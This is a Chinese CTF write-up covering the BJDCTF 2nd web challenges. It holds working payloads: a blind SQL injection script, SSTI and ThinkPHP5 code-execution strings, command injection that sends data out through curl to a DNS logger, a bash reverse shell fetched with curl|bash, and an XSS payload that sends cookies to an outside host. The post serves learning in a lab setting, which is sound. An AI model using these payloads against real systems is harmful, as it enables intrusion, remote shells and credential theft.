title: BJDCTF 2nd做题记录
author: bmth
tags:
  - BJDCTF 2nd
  - CTF
categories: []
img: 'https://img-blog.csdnimg.cn/20210304212353748.png'
date: 2020-11-01 15:52:00
---
## [BJDCTF 2nd]简单注入
这道题没写出来，又很好奇怎么解的，所以先写一下，最初想了好久才想到可以用`\转义掉'`，然后就开始盲注，发现禁用了select，尝试绕过未果，卡死，看师傅文章才发现可以正则匹配出password，妙呀，先写一下我的思路
`username=\`
`password= or !(1<>1)#`
得到
![](https://img-blog.csdnimg.cn/20200323200401655.png)
发现不一样了，那么就可以开始构造语句了，`or !(!(length(database())<>7)<>1)#`
![](https://img-blog.csdnimg.cn/20200323200929320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后用substr截取得到了数据库名为p3rh4ps，然后就select不出来了，这里改为用regexp，由于直接regexp匹配在3.23.4版本后是不分大小写的，要加上binary关键字，试试爆出password
`username=%5C&password=or password regexp binary 0x5e4f#`其中0x5e4f为^O的16进制编码
![](https://img-blog.csdnimg.cn/20200323204753604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
说明第一个字为O，依次爆出即可
师傅脚本如下：
```python
import os
import requests as req

def ord2hex(string):
  result = ''
  for i in string:
    result += hex(ord(i))
  result = result.replace('0x','')
  return '0x'+result


url = "http://59edc701-b28a-4a3c-a3cf-06d107c8f72c.node3.buuoj.cn/index.php"
string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789']
headers = {
      'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
      'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Connection':'keep-alive'
    }

res = ''
for i in range(50):
  for j in string:
    passwd = ord2hex('^'+res+chr(j))
     #print(passwd)
    passwd = 'or password regexp binary {}#'.format(passwd)
    data = {
      'username':"admin\\",
      'password':passwd
    }

    r = req.post(url, data=data, headers=headers)
    # print(r.text)
    if "BJD need" in r.text:
      res += chr(j)
      print(res)
      break
```
得到密码，admin进入即可得到flag
![](https://img-blog.csdnimg.cn/20200323205223860.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200323205319300.png)
真的没想到直接爆password，然后16进制代替'^'也很巧妙

## [BJDCTF 2nd]fake google
这题ssti注入，网上也有payload，我找的是这个：[SSTI (服务器模板注入)](https://blog.csdn.net/qq_40657585/article/details/83657220?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task)
首先进入发现是一个搜索框，试试
```python
{{7*7}}
```
![](https://img-blog.csdnimg.cn/20200324095649694.png)
变为了49，那么就可以套用payload了，直接命令执行
```python
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()") }}{% endif %}{% endfor %}
```
或者直接用师傅的payload
```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /flag').read() }}
```
![](https://img-blog.csdnimg.cn/20200324100237769.png)
## [BJDCTF 2nd]old-hack
这题很明显是thinkphp5的漏洞，在网上找到相应的payload即可，我找的是这个：[ThinkPHP5.0.*版本代码执行漏洞](https://blog.csdn.net/xuandao_ahfengren/article/details/86333189)
POST提交`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls`
![](https://img-blog.csdnimg.cn/20200324101102357.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
试试cat /flag就得到了flag：`_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag`
![](https://img-blog.csdnimg.cn/2020032410124077.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
试了好多payload才成功的，有些payload会报错
## [BJDCTF 2nd]duangShell
我做出来的最后一题，后面的就不会了，首先提示.swp，那么首先下载
![](https://img-blog.csdnimg.cn/20200324101709414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
在linux下使用vim修复即可得到源码`vim -r index.php.swp`
![](https://img-blog.csdnimg.cn/20200324102426121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
使用post传girl_friend，并且还要绕过正则匹配，主要的是使用exec()，这个函数使无回显的，由于我之前见过无回显情况，使用的是curl
使用内网的DNS服务
![](https://img-blog.csdnimg.cn/20200324102847787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
首先POST传`girl_friend=curl 111111.5982bd2d233be1da76ca.d.dns.requestbin.buuoj.cn`
得到了回显
![](https://img-blog.csdnimg.cn/20200324103125181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
那么可以使用``执行命令了
```javascript
girl_friend=curl `tac /flag`.5982bd2d233be1da76ca.d.dns.requestbin.buuoj.cn
```
怎么和我做的时候不一样，还要找flag。。。
最后在/etc/demo/P3rh4ps/love/you/flag找到了flag，这里我还是用师傅的方法，反弹shell
首先创建一个小号，然后使用xshell连接linux靶机并登录即可使用，首先查看ip
`ifconfig -a`
![](https://img-blog.csdnimg.cn/20200324130907586.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后在www/html写一个文件a.txt：
`bash -i >& /dev/tcp/174.1.90.231/2333 0>&1`
nc监听端口2333`nc -lvp 2333`
最后curl即可`girl_friend=curl 174.1.90.231/a.txt|bash`
![](https://img-blog.csdnimg.cn/20200324131147421.png)
接下来寻找flag `find / -name flag`
![](https://img-blog.csdnimg.cn/20200324131758789.png)
最后cat即可`cat /etc/demo/P3rh4ps/love/you/flag`
![](https://img-blog.csdnimg.cn/20200324132030921.png)
## [BJDCTF 2nd]假猪套天下第一
这道题没什么思路，看wp发现先抓包，得到L0g1n.php
![](https://img-blog.csdnimg.cn/20200324132826692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问
![](https://img-blog.csdnimg.cn/20200324132932940.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
~~然后等99年~~，抓包看看，修改cookie的time
![](https://img-blog.csdnimg.cn/20200324133730236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后是本地访问，XFF不能用，但还可以用Client-IP或者X-Real-IP代替XFF
`Client-IP:127.0.0.1`
![](https://img-blog.csdnimg.cn/20200324133959583.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
要从gem-love.com访问，增加Referer
`Referer:gem-love.com`
![](https://img-blog.csdnimg.cn/20200324134249434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后要使用Commodo 64访问，但是 UA 改成 Commodo 64 后被告诉这不是真的 commodo64，随便查一下就能发现有一种系统叫 Commodore，所以要改成 Commodore 64（也可以直接查它的 UA 的标准形式）~~抄一下~~
`"Contiki/1.0 (Commodore 64; http://dunkels.com/adam/contiki/)"`
![](https://img-blog.csdnimg.cn/20200324134643128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后是email is root@gem-love.com
`From:root@gem-love.com`
![](https://img-blog.csdnimg.cn/20200324135115981.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后是use the http proxy of y1ng.vip
`Via:y1ng.vip`
![](https://img-blog.csdnimg.cn/20200324135405648.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
得到base64编码的flag，解码即可

## [BJDCTF 2nd]Schrödinger
难度迷惑可还行
首先查看源码得到test.php，由于是白色所以看不见
![](https://img-blog.csdnimg.cn/20200324164434519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
发现是个登录页面，做题时没看到这个，看wp后缩小了才看到的。。。。。
![](https://img-blog.csdnimg.cn/20200324164637872.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
然后用之前给的界面进行爆破，抓包可以看到cookie有个base64编码的字符串
![](https://img-blog.csdnimg.cn/20200324165120641.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
解码得1585039815，是提交时的时间戳
![](https://img-blog.csdnimg.cn/20200324165245437.png)
直接将cookie置空试试
![](https://img-blog.csdnimg.cn/20200324170337410.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
真就变为了%99，迷惑
![](https://img-blog.csdnimg.cn/20200324170428171.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
check就可以得到av号了
![](https://img-blog.csdnimg.cn/20200324170708344.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
最后去b站看看是什么视频`av11664517`,北京大学量子力学。。。。。。
![](https://img-blog.csdnimg.cn/20200324171353598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [BJDCTF 2nd]xss之光
拿到题开头gungungun就不会了，没想到是git泄露
![](https://img-blog.csdnimg.cn/20200324175207197.png)
拿到源码：
```php
<?php
$a = $_GET['yds_is_so_beautiful'];
echo unserialize($a);
```
这是利用php的原生类进行xss payload，用的是Exception反序列化
由于师傅说只要xss执行window.open()就能把flag带出来，直接利用了师傅的代码
```php
<?php
$y1ng = new Exception('"<script>window.open(\'http://gem-love.com:12358/?\'+document.cookie);</script>');
echo urlencode(serialize($y1ng));
```
运行得到一串url编码的字符串，传入即可在cookie得到flag
![](https://img-blog.csdnimg.cn/20200324182131881.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [BJDCTF 2nd]elementmaster
得到一张图片，查看源代码得到信息
![](https://img-blog.csdnimg.cn/2020032418252523.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```javascript
id=506F2E，16进制解码为Po.
id=706870，16进制解码为php
```
访问得到一个点，那么猜测元素周期表的所有元素都存在
![](https://img-blog.csdnimg.cn/20200324182819236.png)
师傅脚本如下：
```python
import os
import requests as req
elements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar',
                  'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 
                  'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 
                  'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 
                  'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 
                  'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr',
                  'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')
for symbol in elements:
    link = "http://2c09f75d-30ec-4811-9ae7-5645bc809efa.node3.buuoj.cn/" + symbol + ".php"
    response = req.get(link)
    if response.status_code == 200:
        print(response.text, end='')
    else:
        continue
```
得到And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php，访问即可得到flag
![](https://img-blog.csdnimg.cn/20200324183332125.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
## [BJDCTF 2nd]文件探测
看wp才发现是查看消息头得到hint
![](https://img-blog.csdnimg.cn/20200324195823853.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问得到，是一个文件包含
![](https://img-blog.csdnimg.cn/20200324195948909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
试着访问robots.txt，存在admin.php和flag.php
![](https://img-blog.csdnimg.cn/20200324200828488.png)
但在home.php引用别的文件就会被拼接上.fxxkyou，导致失败，所以先使用伪协议读取system的代码
`?file=php://filter/convert.base64-encode/resource=system`
```php
<?php
error_reporting(0);
if (!isset($_COOKIE['y1ng']) || $_COOKIE['y1ng'] !== sha1(md5('y1ng'))){
    echo "<script>alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');</script>";
    header("Refresh:0.1;url=index.php");
    die;
}

$str2 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;url invalid<br>~$ ';
$str3 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;damn hacker!<br>~$ ';
$str4 = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Error:&nbsp;&nbsp;request method error<br>~$ ';

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>File Detector</title>

    <link rel="stylesheet" type="text/css" href="css/normalize.css" />
    <link rel="stylesheet" type="text/css" href="css/demo.css" />

    <link rel="stylesheet" type="text/css" href="css/component.css" />

    <script src="js/modernizr.custom.js"></script>

</head>
<body>
<section>
    <form id="theForm" class="simform" autocomplete="off" action="system.php" method="post">
        <div class="simform-inner">
            <span><p><center>File Detector</center></p></span>
            <ol class="questions">
                <li>
                    <span><label for="q1">你知道目录下都有什么文件吗?</label></span>
                    <input id="q1" name="q1" type="text"/>
                </li>
                <li>
                    <span><label for="q2">请输入你想检测文件内容长度的url</label></span>
                    <input id="q2" name="q2" type="text"/>
                </li>
                <li>
                    <span><label for="q1">你希望以何种方式访问？GET？POST?</label></span>
                    <input id="q3" name="q3" type="text"/>
                </li>
            </ol>
            <button class="submit" type="submit" value="submit">提交</button>
            <div class="controls">
                <button class="next"></button>
                <div class="progress"></div>
                <span class="number">
					<span class="number-current"></span>
					<span class="number-total"></span>
				</span>
                <span class="error-message"></span>
            </div>
        </div>
        <span class="final-message"></span>
    </form>
    <span><p><center><a href="https://gem-love.com" target="_blank">@颖奇L'Amore</a></center></p></span>
</section>

<script type="text/javascript" src="js/classie.js"></script>
<script type="text/javascript" src="js/stepsForm.js"></script>
<script type="text/javascript">
    var theForm = document.getElementById( 'theForm' );

    new stepsForm( theForm, {
        onSubmit : function( form ) {
            classie.addClass( theForm.querySelector( '.simform-inner' ), 'hide' );
            var messageEl = theForm.querySelector( '.final-message' );
            form.submit();
            messageEl.innerHTML = 'Ok...Let me have a check';
            classie.addClass( messageEl, 'show' );
        }
    } );
</script>

</body>
</html>
<?php

$filter1 = '/^http:\/\/127\.0\.0\.1\//i';
$filter2 = '/.?f.?l.?a.?g.?/i';


if (isset($_POST['q1']) && isset($_POST['q2']) && isset($_POST['q3']) ) {
    $url = $_POST['q2'].".y1ng.txt";
    $method = $_POST['q3'];

    $str1 = "~$ python fuck.py -u \"".$url ."\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei<br>";

    echo $str1;

    if (!preg_match($filter1, $url) ){
        die($str2);
    }
    if (preg_match($filter2, $url)) {
        die($str3);
    }
    if (!preg_match('/^GET/i', $method) && !preg_match('/^POST/i', $method)) {
        die($str4);
    }
    $detect = @file_get_contents($url, false);
    print(sprintf("$url method&content_size:$method%d", $detect));
}

?>
```
之后代码审计不是很会，看大佬博客：
url会被拼接上.y1ng.txt。只需要让他拼接到参数后面去就行了，payload：
`http://127.0.0.1/admin.php?a=1`
进行file_get_contents()，然后格式化输出，但是输出的是%d，也就是个整数，并不是%s。对于%d可以发现代码中的$method和%d是连起来的，可以用GET%s来格式化，还需要把%d转义掉，对于sprintf()函数，对百分号的转义是用2个%而不是反斜线
`GET%s%`
所以依次输入即可得到admin.php的源码
![](https://img-blog.csdnimg.cn/20200324202543289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
```php
<?php
error_reporting(0);
session_start();
$f1ag = 'f1ag{s1mpl3_SSRF_@nd_spr1ntf}'; //fake

function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5($_SERVER['REMOTE_ADDR'],true);
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

function Check()
{
    if (isset($_COOKIE['your_ip_address']) && $_COOKIE['your_ip_address'] === md5($_SERVER['REMOTE_ADDR']) && $_COOKIE['y1ng'] === sha1(md5('y1ng')))
        return true;
    else
        return false;
}

if ( $_SERVER['REMOTE_ADDR'] == "127.0.0.1" ) {
    highlight_file(__FILE__);
} else {
    echo "<head><title>403 Forbidden</title></head><body bgcolor=black><center><font size='10px' color=white><br>only 127.0.0.1 can access! You know what I mean right?<br>";
}


$_SESSION['user'] = md5($_SERVER['REMOTE_ADDR']);

if (isset($_GET['decrypt'])) {
    $decr = $_GET['decrypt'];
    if (Check()){
        $data = $_SESSION['secret'];
        include 'flag_2sln2ndln2klnlksnf.php';
        $cipher = aesEn($data, 'y1ng');
        if ($decr === $cipher){
            echo WHAT_YOU_WANT;
        } else {
            die('爬');
        }
    } else{
        header('Location: index.php');
    }
} else {
    //I heard you can break PHP mt_rand seed
    mt_srand(rand(0,9999999));
    $length = mt_rand(40,80);
    $_SESSION['secret'] = bin2hex(random_bytes($length));
}
?>
```
对那个随机数`$_SESSION['secret']`进行aes加密操作，如果加密结果和我们传进去的decrypt相同就会输出flag：
这个生成的不能被破解的随机字符串被放在了session中，如果没有了session就没有了这个随机字符串，只要通过删除PHPSESSID将SESSION置空即可
师傅算AES的脚本：
```php
<?php
function aesEn($data, $key)
{
    $method = 'AES-128-CBC';
    $iv = md5('8.8.8.8', true); // your global ip address here
    return  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));
}

$cipher = aesEn('', 'y1ng');
echo $cipher;
```
我的是得到`70klfZeYC+WlC045CcKhtg==`
传入`/admin.php?decrypt=70klfZeYC+WlC045CcKhtg==`并使用cookie软件将session为空，最终得到flag
(由于base64的AES带加号，在URL被解析为空格，因此需要URL编码)
![](https://img-blog.csdnimg.cn/20200324211204420.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
对大佬来说是普通，对菜鸡来说就是~~巨男，男上加男~~，还差最后一个赵师傅的“简单题”，等搞懂了再补充吧。。。。

参考：
[颖奇：第二届BJDCTF 2020 全部WEB题目 Writeup](https://www.gem-love.com/ctf/2097.html#i-3)
[2020第二届BJDCTF](https://www.ctfwp.com/%E5%AE%98%E6%96%B9%E8%B5%9B%E4%BA%8B%E9%A2%98/2020%E7%AC%AC%E4%BA%8C%E5%B1%8ABJDCTF)